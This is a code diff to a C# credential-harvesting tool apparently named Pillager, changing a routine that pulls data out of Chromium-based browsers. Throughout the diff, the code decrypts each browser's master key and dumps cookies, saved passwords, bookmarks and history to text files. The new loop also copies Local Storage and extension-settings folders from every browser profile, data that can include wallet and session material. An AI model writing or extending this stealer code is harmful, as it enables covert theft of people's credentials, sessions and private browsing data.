@@ -222,7 +222,7 @@ namespace Pillager.Browsers
 
         public static void Save(string path)
         {
-            foreach (var browser in Chrome.browserOnChromium)
+            foreach (var browser in browserOnChromium)
             {
                 try
                 {
@@ -230,7 +230,7 @@ namespace Pillager.Browsers
                     BrowserName = browser.Key;
                     BrowserPath = chromepath;
                     MasterKey = GetMasterKey();
-                    if (MasterKey == null) return;
+                    if (MasterKey == null) continue;
                     string savepath = Path.Combine(path, BrowserName);
                     Directory.CreateDirectory(savepath);
                     string cookies = Chrome_cookies();
@@ -241,9 +241,14 @@ namespace Pillager.Browsers
                     if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
                     if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
                     if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
-                    if (Directory.Exists(Path.Combine(BrowserPath, "Local Storage"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Local Storage"), Path.Combine(savepath, "Local Storage"), true);
-                    if (Directory.Exists(Path.Combine(BrowserPath, "Local Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Local Extension Settings"), Path.Combine(savepath, "Local Extension Settings"), true);
-                    if (Directory.Exists(Path.Combine(BrowserPath, "Sync Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Sync Extension Settings"), Path.Combine(savepath, "Sync Extension Settings"), true);
+                    foreach (var profile in profiles)
+                    {
+                        Directory.CreateDirectory(Path.Combine(BrowserPath, profile));
+                        if (Directory.Exists(Path.Combine(BrowserPath, profile+"\\Local Storage"))) Methods.CopyDirectory(Path.Combine(BrowserPath, profile + "\\Local Storage"), Path.Combine(savepath, profile + "\\Local Storage"), true);
+                        if (Directory.Exists(Path.Combine(BrowserPath, profile+"\\Local Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, profile + "\\Local Extension Settings"), Path.Combine(savepath, profile + "\\Local Extension Settings"), true);
+                        if (Directory.Exists(Path.Combine(BrowserPath, profile + "\\Sync Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, profile + "\\Sync Extension Settings"), Path.Combine(savepath, profile + "\\Sync Extension Settings"), true);
+                        if (Directory.GetDirectories(Path.Combine(BrowserPath, profile)).Length == 0) Directory.Delete(Path.Combine(BrowserPath, profile));
+                    }
                 }
                 catch { }
             }
